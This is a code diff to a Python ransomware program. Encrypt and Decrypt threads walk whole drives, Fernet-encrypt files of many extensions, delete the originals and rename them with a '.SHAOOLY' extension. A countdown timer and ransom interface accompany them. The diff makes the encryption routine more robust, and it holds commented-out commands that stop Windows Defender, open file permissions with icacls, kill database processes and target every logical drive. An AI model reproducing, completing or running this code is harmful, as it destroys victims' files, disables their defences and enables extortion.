@@ -23,6 +23,12 @@ class Timer:
 
     def start_clock(self):
         if self.hours == 0 and self.minutes == 0 and self.seconds == 1:
+           # for r, d, f in os.walk():
+           #     for file in f:
+           #         if file.split(".")[-1] == "SHAOOLY":
+           #             filepath = os.path.join(r, file)
+           #             os.remove(filepath)
+           #
             return  # Stop timer
 
         self.seconds -= 1
@@ -39,10 +45,8 @@ class Timer:
 
 class Encrypt(Thread):
 
-    def __init__(self, drive):
+    def __init__(self, drive, key):
         self.drive = drive
-        with open("file_encryption_key.txt", 'rb') as key_file:
-            key = key_file.read()
         self.fernet = Fernet(key)
         self.accepted_extensions = [
                                     "Sxw",
@@ -212,6 +216,7 @@ class Encrypt(Thread):
                                     "gpg",
                                     "vmx",
                                     ]
+        self.max_size = 1500000000
 
     def run(self):
         for r, d, f in os.walk(self.drive):
@@ -225,23 +230,34 @@ class Encrypt(Thread):
                             file_extension = file.split(".")[-1]
                         file_name = file.split(".")[0]
                         enc_file_name = f'{r}/{file_name}.SHAOOLY'
-                        with open(filepath, 'rb') as byte_file:
-                            enc_file_content = self.fernet.encrypt(byte_file.read())
-                        with open(enc_file_name, 'x') as encrypted_file:
-                            encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
-                        os.remove(filepath)
+                        if os.path.getsize(filepath) < self.max_size:
+                            try:
+                                with open(filepath, 'rb') as byte_file:
+                                    enc_file_content = self.fernet.encrypt(byte_file.read())
+                                    os.remove(filepath)
+                                    with open(enc_file_name, 'x') as encrypted_file:
+                                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
+                            except FileExistsError as _fileExists:
+                                index = 0
+                                while True:
+                                    index += 1
+                                    try:
+                                        enc_file_name = f'{r}/{file_name}({index}).SHAOOLY'
+                                        with open(enc_file_name, 'x') as encrypted_file:
+                                            encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
+                                        break
+                                    except FileExistsError as _fileExits:
+                                        pass
 
 
 class Decrypt(Thread):
-    def __init__(self, drive):
+    def __init__(self, drive, key):
         Thread.__init__(self)
         self.drive = drive
-
-        with open("file_encryption_key.txt", 'rb') as key_file:
-            key = key_file.read()
         self.fernet = Fernet(key)
 
     def run(self):
+        print(f"Started denrypting drive {self.drive}")
         for r, d, f in os.walk(self.drive):
             for file in f:
                 filepath = os.path.join(r, file)
@@ -251,9 +267,12 @@ class Decrypt(Thread):
                         file_content = enc_file.read().split('\n')
                     ext = file_content[0]
                     file_name_with_ext = f'{filename}.{ext}'
-                    with open(file_name_with_ext, 'wb') as dec_file:
-                        dec_file.write(self.fernet.decrypt(file_content[1].encode()))
-                    os.remove(filepath)
+                    try:
+                        with open(file_name_with_ext, 'wb') as dec_file:
+                            dec_file.write(self.fernet.decrypt(file_content[1].encode()))
+                        os.remove(filepath)
+                    except OSError as _osException:
+                        pass
 
 
 class RansomwareClient:
@@ -302,6 +321,10 @@ class Interface:
 
     def decryption_start(self):
         if self.canDecrypt:
+            # drives = win32api.GetLogicalDriveStrings()
+            # drives = drives.split('\000')[:-1]
+            # for drive in drives:
+            #     Decrypt(drive).start()
             self.canvas['background'] = '#558c0d'
             self.canvas.delete('all')
             self.clock.destroy()
@@ -404,9 +427,13 @@ def set_wallpaper(path):
 
 
 if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a security measure for now
+    try:
+        pass
+    except Exception as N:
+        print(N)
     # os.system("sc stop WinDefend")
     # os.system("attrib +h .")
-    # os.system("icals . /grant Everyone:F /T /C /Q")
+    # os.system("icacls . /grant Everyone:F /T /C /Q")
     # os.system("taskkill.exe /f /im mysqld.exe")
     # os.system("taskkill.exe /f /im sqlwriter.exe")
     # os.system("taskkill.exe /f /im sqlserver.exe")
@@ -418,7 +445,7 @@ if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a securi
     #    drives = drives.split('\000')[:-1]
     #    for drive in drives:
     #        pass
-    #        # Encrypt(drive).run()
+    #        # Encrypt(drive).start()
     my_interface = Interface(client)
     my_interface.run() # NOTE: The interface will be started last.
 
@@ -430,11 +457,3 @@ if __name__ == "__main__":  # and 1 == 2:  # I added the 1 == 2 just as a securi
     # setWallpaper("computer_background.jpeg")
 #
 
-#    with open("key.txt", 'rb) as file:
-#         key = file.read()
-#    fernet = Fernet(key)
-#    drives = win32api.GetLogicalDriveStrings()
-#    drives = drives.split('\000')[:-1]
-#    for drive in drives:
-#        pass
-#        # Encrypt(drive).run()
